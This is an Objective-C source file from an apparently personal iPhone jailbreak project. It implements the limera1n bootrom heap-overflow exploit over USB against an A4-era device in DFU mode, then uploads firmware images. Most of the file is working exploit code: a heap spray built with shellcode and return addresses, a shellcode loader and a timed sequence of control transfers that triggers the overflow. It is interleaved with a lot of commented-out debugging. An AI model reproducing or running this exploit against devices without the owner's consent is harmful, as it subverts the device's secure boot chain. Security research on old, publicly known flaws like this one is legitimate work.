//
//  main.m
//  jailbreak
//
//  Created by Phillip Tennen on 08/07/2023.
//

#import <Foundation/Foundation.h>
#import <IOKit/usb/IOUSBLib.h>
#import <libusb-1.0/libusb.h>

#define LOADADDR    0x84000000
// A4:
#define EXPLOIT_LR    0x8403BF9C
#define LOADADDR_SIZE    0x2C000
#define FOUR_K_PAGE 0x1000

// DFU_MAX_TRANSFER_SIZE
#define BUF_SIZE 0x800

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

void dump_state(struct libusb_device_handle* device_handle) {
    char state[0x800] = {0};
    int ret = libusb_control_transfer(device_handle, 0xA1, 5, 0, 0, state, 0, 1000);
    NSLog(@"dump_state ret: %d", ret);
    hexdump(state, 0x800);
}


struct libusb_device_handle* find_device(struct libusb_context* context, int vendor_id, int device_id, char* serial_number_out) {
    NSLog(@"Looking for device...");
    struct libusb_device** device_list = NULL;
    ssize_t device_count = libusb_get_device_list(context, &device_list);
    NSLog(@"Found %d devices in device list %p", device_count, device_list);
    struct libusb_device_handle* handle = NULL;

    for (ssize_t i = 0; i < device_count; i++) {
        struct libusb_device* device = device_list[i];
        struct libusb_device_descriptor device_desc;
        libusb_get_device_descriptor(device, &device_desc);
        //NSLog(@"Found device: [Vendor 0x%04x], [Product 0x%04x]", device_desc.idVendor, device_desc.idProduct);
        
        if (device_desc.idVendor == vendor_id && device_desc.idProduct == device_id) {
            libusb_open(device, &handle);
            char serial[128] = {0};
            libusb_get_string_descriptor_ascii(handle, device_desc.iSerialNumber, &serial, 128);
            //NSLog(@"Found device handle %p, serial %s", handle, serial);
            if (serial_number_out) {
                strcpy(serial_number_out, &serial);
            }
            break;
        }
    }
    libusb_free_device_list(device_list, 1);
    
    return handle;
}

long readfile(char* filename, void* buffer) {
    FILE* f = fopen(filename, "rb");
    if (!f) {
        NSLog(@"File couldn't be opened: %s", filename);
        exit(1);
    }
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    fread(buffer, 1, len, f);
    fclose(f);
    return len;
}

uint32_t get_file_len(FILE* f) {
    fseek(f, 0, SEEK_END);
    uint32_t len = (uint32_t)ftell(f);
    fseek(f, 0, SEEK_SET);
    return len;
}

void get_status(struct libusb_device_handle* device_handle) {
    unsigned char status[6];
    int ret = libusb_control_transfer(device_handle, 0xa1, 3, 0, 0, status, 6, 100);
    NSLog(@"get_status ret = %d", ret);
}

void dfu_notify_upload_finished(struct libusb_device_handle* device_handle) {
    // ipwndfu calls this "request_image_validation"
    // Ref: https://archive.conference.hitb.org/hitbsecconf2013kul/materials/D2T1%20-%20Joshua%20'p0sixninja'%20Hill%20-%20SHAttered%20Dreams.pdf
    // "Image validation starts whenever the global “file received” variable has been set."
    // "This can be caused by sending 1 empty “Send Data” packet, and 3 “Get Status” packets followed by a USB reset."
    libusb_control_transfer(device_handle, 0x21, 1, 0, 0, 0, 0, 100);
    for (int i = 0; i < 3; i++) {
        get_status(device_handle);
    }
    NSLog(@"Resetting device to complete upload flow...");
    libusb_reset_device(device_handle);
    // Ensure we always wait a bit before doing anything else, after requesting image validation
    //usleep(500);
}

void upload_file(struct libusb_device_handle* device_handle, const char* filename) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        NSLog(@"File could not be opened! %s", filename);
        exit(1);
    }
    uint32_t file_len = get_file_len(file);
    NSLog(@"File is %d bytes", file_len);
    int chunk_size = 0x800;
    unsigned char* chunk_buf = malloc(chunk_size);
    for (int i = 0; i < file_len; i += chunk_size) {
        int read_bytes = (int)fread(chunk_buf, 1, chunk_size, file);
        NSLog(@"\tUpload %d%% done, sending %d bytes...", (int)(((float)i / (float)file_len) * 100.0), read_bytes);
        int ret = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, chunk_buf, read_bytes, 3000);
        NSLog(@"\t\t%d", ret);
    }
    NSLog(@"Informing the device that the upload is finished...");
    //libusb_reset_device(device_handle);
    dfu_notify_upload_finished(device_handle);
}

void upload_recovery(struct libusb_device_handle* device_handle, const char* filename) {
    /*
    def send_data(device, data):
        #print 'Sending 0x%x of data to device.' % len(data)
        assert device.ctrl_transfer(0x41, 0, 0, 0, 0, 1000) == 0
        index = 0
        while index < len(data):
            amount = min(len(data) - index, MAX_PACKET_SIZE)
            assert device.write(0x04, data[index:index + amount], 1000) == amount
            index += amount
     */

    /*
    FILE* file = fopen(filename, "rb");
    uint32_t file_len = get_file_len(file);
    NSLog(@"File is %d bytes", file_len);
    int chunk_size = 0x4000;
    unsigned char* chunk_buf = malloc(chunk_size);
    libusb_control_transfer(device_handle, 0x41, 0, 0, 0, 0, 0, 3000);
    for (int i = 0; i < file_len; i += chunk_size) {
        int read_bytes = (int)fread(chunk_buf, 1, chunk_size, file);
        NSLog(@"\tUpload %d%% done...", (int)(((float)i / (float)file_len) * 100.0));
        //int ret = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, chunk_buf, chunk_size, 3000);
    }
    NSLog(@"Informing the device that the upload is finished...");
    libusb_reset_device(device_handle);
    dfu_notify_upload_finished(device_handle);
     */
}

struct libusb_device_handle* usb_wait_device_connection(struct libusb_context* context, struct libusb_device_handle* device_handle) {
    //sleep(2);
    libusb_close(device_handle);
    return find_device(context, 0x05ac, 0x1227, NULL);
}

struct libusb_device_handle* find_recovery_mode_device(struct libusb_context* context, struct libusb_device_handle* device_handle) {
    //sleep(2);
    libusb_close(device_handle);
    return find_device(context, 0x05ac, 0x1281, NULL);
}

void reset_counters(struct libusb_device_handle* device_handle) {
    // assert device.ctrl_transfer(0x21, 4, 0, 0, 0, 1000) == 0
    int ret = libusb_control_transfer(device_handle, 0x21, 4, 0, 0, 0, 0, 1000);
    NSLog(@"reset_counters retval (expect 0): %d", ret);
}

struct libusb_device_handle* run_limera1n(struct libusb_context* context, struct libusb_device_handle* device_handle) {
    // Run limera1n
    unsigned char buf[LOADADDR_SIZE] = {0};
    unsigned char shellcode[BUF_SIZE] = {0};
    unsigned int stack_addr = EXPLOIT_LR;
    // PT: Is the +1 to indicate THUMB?
    unsigned int shellcode_addr = LOADADDR + LOADADDR_SIZE - FOUR_K_PAGE + 1;
    NSLog(@"Shellcode addr 0x%x", shellcode_addr);
    
    // Read the shellcode into the buffer
    // TODO: Check the shellcode looks correct?
    NSLog(@"Reading file...");
    long shellcode_length = readfile("/Users/philliptennen/Documents/Jailbreak/jailbreak/payload_stage1/build/payload_stage1_shellcode", shellcode);
    NSLog(@"Shellcode len %lx", shellcode_length);
    
    NSLog(@"Sending heap fill with jump");
    memset(buf, 0xcc, BUF_SIZE);
    for (int i = 0; i < BUF_SIZE; i += 0x40) {
        unsigned int* heap = (unsigned int*)(buf + i);
        heap[0] = 0x405;
        heap[1] = 0x101;
        heap[2] = shellcode_addr;
        heap[3] = stack_addr;
    }
    
    // Send the heap fill
    // (This one includes the jump addr)
    NSLog(@"Sending heap fill");
    int sent_bytes = libusb_control_transfer(device_handle,
                                             0x21,
                                             1,
                                             0,
                                             0,
                                             buf,
                                             BUF_SIZE,
                                             1000);
    
    // Fill the heap even more?!
    NSLog(@"Filling the heap some more");
    memset(buf, 0xcc, BUF_SIZE);
    for (int i = 0; i < (LOADADDR_SIZE - 0x1800); i += BUF_SIZE) {
        sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, buf, BUF_SIZE, 1000);
        //NSLog(@"Sent bytes %X %s\n", sent_bytes, libusb_error_name(sent_bytes));
    }
    
    NSLog(@"Sending shellcode");
    sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, shellcode, BUF_SIZE, 1000);
    NSLog(@"Sent %X bytes of shellcode, length = %lX", sent_bytes, shellcode_length);
    memset(buf, 0xbb, 0x800);
    sent_bytes = libusb_control_transfer(device_handle, 0xa1, 1, 0, 0, buf, 0x800, 1000);
    //NSLog(@"never freed %X", sent_bytes);
    //NSLog(@"Reading back some data");
    //hexdump(buf, 0x800);
    
    NSLog(@"Sending some random data to force a timeout");
    sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, buf, 0x800, 10);
    //NSLog(@"new one %x", sent_bytes);
    
    // This should fail too
    sent_bytes = libusb_control_transfer(device_handle, 0x21, 2, 0, 0, buf, 0, 10);
    NSLog(@"Sent exploit to heap overflow %X %s", sent_bytes, libusb_error_name(sent_bytes));

    libusb_reset_device(device_handle);
    dfu_notify_upload_finished(device_handle);
    //libusb_reset_device(device_handle);
    // communicate with the payload
    struct libusb_device_handle* device_handle2 = usb_wait_device_connection(context, device_handle);
    NSLog(@"Reconnected, limera1n finished");
    
    //dump_state(device_handle2);

    //NSLog(@"all done");
    return device_handle2;
}

void pull_dump(struct libusb_device_handle* device_handle) {
    NSLog(@"Pulling a dump...");
    FILE* fout = fopen("/Users/philliptennen/Documents/Jailbreak/jailbreak/sentinel_dump2.bin", "wb");
    unsigned char data[0x800] = {0};
    for (int addr = 0; addr < 0x1000; addr += 0x800) {
        int ret = libusb_control_transfer(device_handle, 0xa1, 2, 0, 0, data, 0x800, 0);
        //NSLog(@"ret %d", ret);
        fwrite(data, 1, 0x800, fout);
    }
    fclose(fout);
}

void inner_main(void) {
    NSLog(@"Main running");
    // Initialize USB connection with the DFU device
    struct libusb_context* context = NULL;
    libusb_init(&context);

    struct libusb_device_handle* device_handle = NULL;
    bool did_already_perform_exploit = false;
    while (1) {
        char serial[128] = {0};
        device_handle = find_device(context, 0x05ac, 0x1227, &serial);
        if (device_handle) {
            did_already_perform_exploit = strcmp(serial, "[Overwritten serial number!]") == 0;
            break;
        }
        NSLog(@"Failed to find DFU device.");
        return;
        sleep(1);
    }

    struct libusb_device_handle* device_handle2 = device_handle;
    
    if (!did_already_perform_exploit) {
        NSLog(@"Device has not been exploited yet...");
        device_handle2 = run_limera1n(context, device_handle2);
    }
    else {
        NSLog(@"Skipped performing exploit because the device is already pwned");
    }

    sleep(1);

    libusb_close(device_handle2);
    libusb_exit(context);
    return;

    //device_handle2 = usb_wait_device_connection(context, device_handle2);

    /*
    upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/jailbreak/payload2/trimmed_shellcode.img3");
    device_handle2 = usb_wait_device_connection(context, device_handle2);
    NSLog(@"spinning");
    sleep(1);
    device_handle2 = usb_wait_device_connection(context, device_handle2);

    while (1) {}
     */

    // Now, try writing an ipsw to see what happens?!
    // Reset counters
    /*
    NSLog(@"resetting counters");
    sleep(1);
    NSLog(@"Serial number:");
     */

    // Reset counters
    //sent_bytes = libusb_control_transfer(device_handle2, 0x21, 2, 0, 0, buf, 0, 1000);
    //NSLog(@"Result of resetting counters %d", sent_bytes);
    
    //dump_state(device_handle);
    
    /*
    //FILE* ipsw = fopen("/Users/philliptennen/Downloads/iPhone3,1_6.1.3_10B329_Restore.ipsw", "rb");
    FILE* ipsw = fopen(", "rb");
    FILE* ipsw = fopen("/Users/philliptennen/Downloads/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/Firmware/dfu/iBSS.n90ap.RELEASE.dfu", "rb");
    uint32_t file_len = get_file_len(ipsw);
    NSLog(@"IPSW is %d bytes", file_len);
    int chunk_size = 0x800;
    unsigned char* ipsw_buf = malloc(chunk_size);
    for (int i = 0; i < file_len; i += chunk_size) {
        int read_bytes = (int)fread(ipsw_buf, 1, chunk_size, ipsw);
        //hexdump(ipsw_buf, chunk_size);
        NSLog(@"\tread %d bytes, progress = %.2f", read_bytes, (float)i / (float)file_len);
        int ret = libusb_control_transfer(device_handle2, 0x21, 1, 0, 0, ipsw_buf, chunk_size, 3000);
        NSLog(@"\t\tret %d", ret);
    }
    */
    
    //reset_counters(device_handle2);
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/Firmware/all_flash/all_flash.n90ap.production/applelogo-640x960.s5l8930x.img3");
    //dfu_notify_upload_finished(device_handle2);
    
    //sleep(1);
    NSLog(@"Uploading IBSS...");
    
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_6.1_10B144_Restore.ipsw.unzipped/Firmware/dfu/iBSS.n90ap.RELEASE.dfu");
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_6.1_10B144_Restore.ipsw.unzipped/Firmware/dfu/iBSS.n90ap.RELEASE.dfu");
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/Firmware/dfu/iBSS.n90ap.RELEASE.dfu");
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/patched_images/iPhone3,1_4.1_8B117/iBSS.n90ap.RELEASE.dfu.reencrypted");
    upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/Firmware/dfu/iBSS.n90ap.RELEASE.dfu");
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/jailbreak/analysis/iPhone3,1_6.0_10A403/iBSS.reencrypted");
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/Firmware/dfu/iBSS.n90ap.RELEASE.dfu");
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/jailbreak/analysis/iPhone3,1_6.0_10A403_iBSS.n90ap.RELEASE.dfu.repack_test");
    //NSLog(@"Upload finished, will ask device to validate...");
    //dfu_notify_upload_finished(device_handle2);
    //libusb_reset_device(device_handle2);
    sleep(1);
    device_handle2 = usb_wait_device_connection(context, device_handle2);

    /*
    printf("Pulling dump...");
    pull_dump(device_handle2);
     */

    //unsigned int addr = 0x0;

    /*
    NSLog(@"Uploading IBEC...");
    device_handle2 = find_recovery_mode_device(context, device_handle2);
    reset_counters(device_handle2);
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/Firmware/dfu/iBEC.n90ap.RELEASE.dfu");
    upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/patched_images/iPhone3,1_4.0_8A293/iBEC.n90ap.RELEASE.dfu.reencrypted");
     */

    //upload_file(device_handle2, "/Users/philliptennen/Downloads/iPhone3,1_6.0_10A403_Restore.ipsw.unzipped/Firmware/dfu/iBEC.n90ap.RELEASE.dfu");
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/jailbreak/analysis/iPhone3,1_6.0_10A403/iBEC.reencrypted");
    //upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/Firmware/dfu/iBEC.n90ap.RELEASE.dfu");
    //sleep(1);

    //device_handle2 = usb_wait_device_connection(context, device_handle2);
    /*
    upload_file(device_handle2, "/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_6.1_10B144_Restore.ipsw.unzipped/kernelcache.release.n90");
    sleep(1);
    device_handle2 = usb_wait_device_connection(context, device_handle2);
    */

    return;
    NSLog(@"Sleep");
    while (1) {}

    NSLog(@"Sent IBEC! Spinning");
    
    while (1) {}
    NSLog(@"Sleeping...");
    sleep(5);
    NSLog(@"Sending restore ramdisk...");
    //upload_file(device_handle2, "/Users/philliptennen/Downloads/iPhone3,1_6.0_10A403_Restore.ipsw.unzipped/038-6494-001.dmg");
    //upload_file_recovery(device_handle2, "/Users/philliptennen/Downloads/iPhone3,1_6.0_10A403_Restore.ipsw.unzipped/038-6494-001.dmg");
    NSLog(@"Sent restore ramdisk!");
    NSLog(@"Spinning here...");
    while (1) {}

    /*
    sleep(5);
    
    ipsw = fopen("/Users/philliptennen/Downloads/iPhone3,1_6.1.3_10B329_Restore.ipsw.unzipped/Firmware/dfu/iBEC.n90ap.RELEASE.dfu", "rb");
    file_len = get_file_len(ipsw);
    NSLog(@"IPSW is %d bytes", file_len);
    ipsw_buf = malloc(chunk_size);
    for (int i = 0; i < file_len; i += chunk_size) {
        int read_bytes = (int)fread(ipsw_buf, 1, chunk_size, ipsw);
        hexdump(ipsw_buf, chunk_size);
        NSLog(@"\tread %d bytes, progress = %.2f", read_bytes, (float)i / (float)file_len);
        int ret = libusb_control_transfer(device_handle2, 0x21, 1, 0, 0, ipsw_buf, chunk_size, 3000);
        NSLog(@"\t\tret %d", ret);
    }
    
     */
    /*
    NSLog(@"Upload finished, will ask device to validate...");
    libusb_reset_device(device_handle2);
    dfu_notify_upload_finished(device_handle2);
    device_handle2 = usb_wait_device_connection(context, device_handle2);
    NSLog(@"got handle2 %p", device_handle2);
     */
    
    //sleep(3);
    NSLog(@"Finished bootstrapping IBSS");
    
    sleep(1);
    NSLog(@"The device should now be running IBSS");
    
    reset_counters(device_handle2);
    //upload_file(device_handle, "/Users/philliptennen/Downloads/iPhone3,1_6.0_10A403_Restore.ipsw.unzipped/Firmware/dfu/iBEC.n90ap.RELEASE.dfu");
    upload_file(device_handle, "test_payload");
    sleep(1);
    //libusb_reset_device(device_handle2);
    device_handle2 = usb_wait_device_connection(context, device_handle2);
    NSLog(@"got handle2 %p", device_handle2);
    
    NSLog(@"Really all done!");
    sleep(5);
    
    char* command = "bgcolor 255 0 0";
    int ret = libusb_control_transfer(device_handle2, 0x40, 0, 0, 0, command, strlen(command) + 1, 30000);
    NSLog(@"ret %d", ret);
    
    while (1) {}
    
    //dump_state(device_handle2);
    
    //NSLog(@"Sending reboot...");
    //irecv_usb_control_transfer(client, 0x40, b_request, 0, 0, (unsigned char*) command, length + 1, USB_TIMEOUT);
    //char* command = "reboot";
    //int ret = libusb_control_transfer(device_handle2, 0x40, 0, 0, 0, command, strlen(command) + 1, 5000);
    //NSLog(@"ret %d", ret);
    //while (1) {}
    
    //libusb_close(device_handle);
    libusb_close(device_handle2);
    libusb_exit(context);
}

int main(int argc, const char* argv[]) {
    @autoreleasepool {
        inner_main();
    }
    return 0;
}
